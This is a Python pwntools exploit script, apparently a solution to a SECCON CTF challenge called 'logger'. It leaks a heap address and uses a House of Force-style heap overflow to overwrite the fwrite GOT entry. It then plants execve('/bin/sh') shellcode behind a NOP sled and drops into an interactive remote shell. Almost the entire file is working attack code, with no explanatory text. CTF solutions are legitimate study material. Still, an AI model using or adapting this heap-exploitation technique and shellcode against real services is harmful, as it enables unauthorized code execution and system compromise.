
from pwn import *
import re
import ctypes


name = 'pistach123213-123123'
password = '/bin/sh;'
fwrite_got = 0x00000000006020C0


def login(s):
    s.recvuntil("1. Login\n2. exit\n")
    s.sendline("1")
    s.recvuntil("Name    :")
    s.sendline(name)
    s.recvuntil("Password:")
    s.sendline(password)

def write_file(s, content):
    s.sendline('2')
    s.sendline('%d' % (len(content)))
    if len(content) == 128:
        s.send(content)
    else:
        s.sendline(content)
    s.clean(0.3)

def write_file_size(s, content, length):
    s.sendline('2')
    s.sendline(str(length))
    if length >= 0:
        s.sendline(content)
    s.clean(0.3)

# create tmp file
#host = ('127.0.0.1', 3690)
host = ('logger.pwn.seccon.jp', 6565)
#host = ('192.168.1.111', 3690)
r = remote(*host)
login(r)
write_file(r, 'A' * 32)
r.sendline("4")
r.close()

r = remote(*host)

login(r)
r.sendline('1')
print r.clean()
r.sendline('3')
top_chunk = u64(re.search("filename: [0-9a-f]{32}(.*)==============",r.recvuntil("==============")).group(1).ljust(8, "\00"))  
new_top_chunk = top_chunk + 216 
print "top chunk at {:08x}".format(top_chunk)
print "new top chunk at {:08x}".format(new_top_chunk)
write_file(r, "OOOOOOOO")
ro = remote(*host)
login(ro)

malloc_size = ((0xffffffffffffffff - new_top_chunk) + fwrite_got)
print hex(malloc_size)

write_file(ro, p64((1 << 64) - 1))
malloc_size = ctypes.c_int64(malloc_size).value

r.sendline("1")
#raw_input("wait 4 remove")
#write_file(ro, "A" * 16)
ro.sendline("4")
ro.close()
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
write_file_size(r, "AAAAAAAA", malloc_size)
write_file(r, p64(0x602110)* 4 + shellcode.rjust( 8 * 12, '\x90')  )
r.interactive()
